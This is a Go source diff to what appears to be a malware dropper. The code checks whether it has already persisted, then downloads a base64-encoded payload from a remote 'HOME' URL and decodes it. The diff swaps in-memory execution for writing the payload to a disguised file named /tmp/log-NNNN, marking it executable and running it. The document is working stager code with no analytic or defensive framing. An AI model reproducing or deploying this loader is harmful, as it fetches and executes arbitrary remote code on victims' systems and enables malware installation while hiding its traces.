@@ -2,15 +2,15 @@ package main
 
 import (
 	"bufio"
+	b64 "encoding/base64"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
-	"path/filepath"
+	"os/exec"
 	"strings"
 	"time"
-
-	"github.com/amenzhinsky/go-memexec"
 )
 
 const (
@@ -19,6 +19,7 @@ const (
 
 var (
 	PAYLOAD []byte
+	FILE string
 )
 
 func main() {
@@ -31,7 +32,8 @@ func main() {
 	}
 	fetch_payload()
 	fmt.Println("Deploying :|")
-	go deploy(PAYLOAD)
+	deploy(PAYLOAD)
+	fmt.Println("[*] Done")
 }
 
 func has_persisted() bool {
@@ -70,11 +72,21 @@ func fetch_payload() {
 	request, _ := http.NewRequest(http.MethodGet, HOME, nil)
 	resp, _ := client.Do(request)
 	body := resp.Body
-	bytes, _ := io.ReadAll(body)
-	PAYLOAD = bytes
+	b64content, _ := io.ReadAll(body)
+	b64str := string(b64content)
+	result := b64str[2:len(b64str)-1]
+	PAYLOAD, _ = b64.StdEncoding.DecodeString(string(result))
 }
 
 func deploy(payload []byte) {
-	exe, _ := memexec.New(PAYLOAD)
-	exe.Command().Output()
+	rand.Seed(time.Now().UnixNano())
+	file_name := fmt.Sprintf("log-%d", (rand.Intn(9999-1111)+1111))
+	FILE = fmt.Sprintf("/tmp/%s", file_name)
+	file, _ := os.OpenFile(FILE, os.O_CREATE|os.O_WRONLY, 0766)
+	file.Write(PAYLOAD)
+	fmt.Println(FILE)
+	file.Close()
+	cmd := exec.Command(FILE)
+	cmd.Start()
+	cmd.Wait()
 }
